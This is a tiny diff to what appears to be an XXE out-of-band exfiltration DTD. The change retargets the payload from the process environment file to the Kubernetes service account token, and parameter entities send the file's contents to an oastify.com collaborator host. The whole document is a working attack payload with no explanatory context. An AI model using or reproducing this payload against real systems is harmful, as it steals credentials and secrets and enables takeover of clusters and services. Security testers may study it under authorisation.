@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///proc/self/environ">
+<!ENTITY % file SYSTEM "file:///run/secrets/kubernetes.io/serviceaccount/token">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ma092clqdtqyc4suqtms9n9ds4yvmsah.oastify.com/?x=%file;'>">
 %eval;
 %exfiltrate;
